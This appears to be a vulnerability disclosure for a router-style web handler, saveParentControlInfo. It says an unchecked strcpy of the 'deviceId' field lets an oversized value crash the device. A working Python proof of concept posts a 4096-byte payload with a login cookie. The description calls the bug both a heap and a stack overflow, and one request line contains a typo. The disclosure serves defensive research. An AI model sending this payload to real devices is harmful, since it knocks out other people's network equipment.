In the function saveParentControlInfo, the content obtained by the program from the parameter "deviceId" is passed to the chunks created by the program, and then the value of the deviceId is copied directly into the heap via the strcpy function. There is no size checking, so there is a stack overflow vulnerability. Attackers can easily perform denial-of-service attacks using well-crafted overflow data.

<img width="416" height="337" alt="image" src="https://github.com/user-attachments/assets/76c4f7ef-0bca-4775-b690-114ef96f6d12" />

POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/saveParentControlInfo"

cookie = {"Cookie":"password=12345"}
data = {"deviceId": payload,"time": "1"}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, caookies=cookie, data=data)
print(response.text)
```
